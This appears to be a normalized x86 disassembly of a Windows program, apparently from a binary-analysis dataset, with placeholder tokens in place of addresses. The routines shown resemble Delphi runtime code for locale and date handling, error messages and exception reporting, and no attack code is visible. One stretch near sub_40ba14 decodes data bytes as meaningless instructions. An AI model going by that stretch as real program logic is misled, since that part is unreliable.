jne r-xdata
call sub_409b0c
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_404178
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4043d8
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407f38
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_404178
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4043d8
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407f38
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40ad0c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a7c0
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a7c0
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a7c0
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a72c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a708
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a7c0
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a84c
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a72c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a7c0
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a84c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a708
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_4097a8
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a7c0
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a72c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a7c0
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a84c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a7c0
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a72c
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40af00
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a9c8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404178
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40af34
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40ad0c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404178
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40af68
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a9c8
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40af34
mov ebx eax
jmp r-xdata
mov eax esi
call sub_404178
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40ad0c
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40aff4
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_403fa8
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b040
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403f0c
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_403fa8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b08c
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b0b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b040
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405c78
sub_40b0f0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b203
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b0b4
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f0c
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b0b4
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403f0c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b0b4
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403f0c
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b0b4
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403f0c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b20a
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403edc
retn
sub_40b214
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_4040b0
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b250
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b2b5
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4040b0
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_408220
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b2bc
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
inc ebx
sub_40b2c8
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b35f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b040
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408220
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b366
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b214
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b250
call EnumCalendarInfoA
sub_40b378
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b542
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403eb8
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b040
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_408220
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_404178
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b549
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403edc
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4089ac
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c3f0
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_4043d8
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404180
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403f0c
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_4089ac
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404180
inc ebx
jmp r-xdata
mov eax esi
call sub_404178
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4089ac
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404180
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404180
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404180
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_4040a0
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404180
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_4040a0
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404180
sub_40b5ac
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b5a0
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c644
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_4088d0
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4051b0
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_403078
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408f08
mov eax [ ebp - 0x4 ]
call sub_40886c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_404378
mov ebx eax
mov eax ebx
call sub_40886c
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b734
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b5ac
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4051b0
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_4029c0
call sub_402834
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_40886c
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b7fc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403f0c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_40b838
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b892
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408f48
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b899
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
add esp 0xfffffff0
call sub_40348c
sub_40b899
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_40b8b8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405c78
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_40b8f4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b960
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405c78
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408f48
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b967
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
add esp 0xfffffff0
call sub_40348c
sub_40b967
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_40b9b4
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028a8
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40ba14
sbb [ edx + 0xa0e0040 ] bh
push esp
inc ebp
js r-xdata
jle r-xdata
jo r-xdata
[ ebx - 0x3d ]
mov eax eax
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bb24
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403f50
jmp r-xdata
push ebx
mov eax edx
jmp sub_4038f4
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bb2b
lea eax [ ebp - 0x20 ]
call sub_403eb8
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b7fc
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b9b4
mov edx eax
sub_40ba88
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bb24
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403f50
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bb2b
lea eax [ ebp - 0x20 ]
call sub_403eb8
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40bb78
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bc10
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bdcb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404128
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_40873c
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bdd2
lea eax [ ebp - 0x170 ]
call sub_403eb8
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403edc
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40bddc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40be97
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40bb78
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b7fc
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
push ebp
call sub_40bc10
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40be9e
lea eax [ ebp - 0x10 ]
call sub_403eb8
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
mov ebx eax
sub_40beb8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40bea8
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40bbf8
mov eax [ rw-data ]
mov [ eax ] sub_40bddc
mov eax sub_40bb44
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40bb60
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40bf3c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403128
